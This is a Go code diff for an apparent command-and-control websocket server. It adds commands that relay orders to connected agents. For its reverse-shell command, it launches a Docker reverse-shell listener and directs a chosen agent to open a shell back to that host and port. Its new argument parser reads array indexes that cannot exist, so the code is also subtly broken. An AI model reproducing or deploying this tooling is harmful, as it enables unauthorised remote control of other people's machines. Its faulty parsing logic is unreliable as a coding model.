@@ -6,6 +6,7 @@ import (
 	"log"
 	"math/rand"
 	"net/http"
+	"os/exec"
 	"strconv"
 	"strings"
 
@@ -19,8 +20,9 @@ type ConnStats struct {
 }
 
 type Server struct {
-	conns  map[*websocket.Conn]ConnStats
-	secret string
+	conns    map[*websocket.Conn]ConnStats
+	secret   string
+	usedPort []string
 }
 
 func NewServer() *Server {
@@ -145,6 +147,14 @@ func (s *Server) command(b []byte, wsSender *websocket.Conn) {
 			s.pong(args[1], wsSender)
 		}
 		break
+	case "/os":
+		// fmt.Println("command------case:pong")
+		if len(args) < 2 {
+			send("Empty parameter !", wsSender)
+		} else {
+			s.handleOs(args[1], wsSender)
+		}
+		break
 	case "/all":
 		if len(args) < 2 {
 			s.all("", wsSender)
@@ -156,7 +166,8 @@ func (s *Server) command(b []byte, wsSender *websocket.Conn) {
 		if len(args) < 2 {
 			send("Empty parameter !", wsSender)
 		} else {
-			s.rs(args[1], wsSender)
+			params := s.rsParser(args[1])
+			s.revSh(params[0], params[1], params[2], wsSender)
 		}
 		break
 	default:
@@ -221,6 +232,12 @@ func (s *Server) pong(args string, wsSender *websocket.Conn) {
 	s.direct([]byte(msg), listIdtab, wsSender)
 }
 
+func (s *Server) handleOs(args string, wsSender *websocket.Conn) {
+	listIdtab := strings.Split(args, " ")
+	msg := "[os] -> " + s.conns[wsSender].id
+	s.direct([]byte(msg), listIdtab, wsSender)
+}
+
 func (s *Server) id(args string, wsSender *websocket.Conn) {
 	result := "id:name\n=========="
 	switch args {
@@ -242,11 +259,41 @@ func (s *Server) id(args string, wsSender *websocket.Conn) {
 	}
 }
 
-func (s *Server) rs(args string, wsSender *websocket.Conn) {
-	params := strings.Split(args, " ")
-	id := []string{params[0]}
-	msg := "[rs] ->" + params[1] + " " + params[2] + " " + params[3] + " <-" + s.conns[wsSender].id // shell ip port
+func (s *Server) rsParser(args string) [5]string {
+	params := strings.SplitN(args, " ", 3)
+	if len(params) < 2 {
+		fmt.Print("empty params")
+		return [5]string{params[0], params[1], "*", params[2], params[3]}
+	}
+	return [5]string{params[0], params[1], params[2], params[3], params[4]} //agent, shell, ip, ssh user, ssh proxy
+
+}
+
+func (s *Server) rsRequest(agentId string, shell string, rserverIp string, rserverPort string, wsSender *websocket.Conn) {
+	id := []string{agentId}
+	msg := "[rs] -> " + shell + " " + rserverIp + " " + rserverPort + " <- " + s.conns[wsSender].id // shell ip port
 	s.direct([]byte(msg), id, wsSender)
+}
+
+func (s *Server) revSh(agentId string, shell string, rserverIp string, wsSender *websocket.Conn) {
+	intport := "6655"
+	extport := strconv.Itoa(7700 + rand.Intn(100))
+	fmt.Println(extport, s.usedPort)
+	for {
+		if isElementExist(s.usedPort, extport) == false {
+			break
+		}
+		extport = strconv.Itoa(7700 + rand.Intn(100))
+	}
+	image := "devoxit/rserver:latest"
+	// spin a reverse server
+	err := dockerize(image, extport, intport)
+	if err != true {
+		fmt.Print(err, "dockerization failed")
+	}
+	s.usedPort = append(s.usedPort, extport)
+	// send to agent order
+	s.rsRequest(agentId, shell, rserverIp, extport, wsSender)
 }
 
 func main() {
@@ -288,4 +335,13 @@ func RandomString(n int) string {
 		s[i] = letters[rand.Intn(len(letters))]
 	}
 	return string(s)
+}
+
+func dockerize(image string, extport string, intport string) bool {
+	cmd := exec.Command("docker", "container", "run", "-p", extport+":"+intport, "-d", image)
+	err := cmd.Run()
+	if err != nil {
+		return false
+	}
+	return true
 }
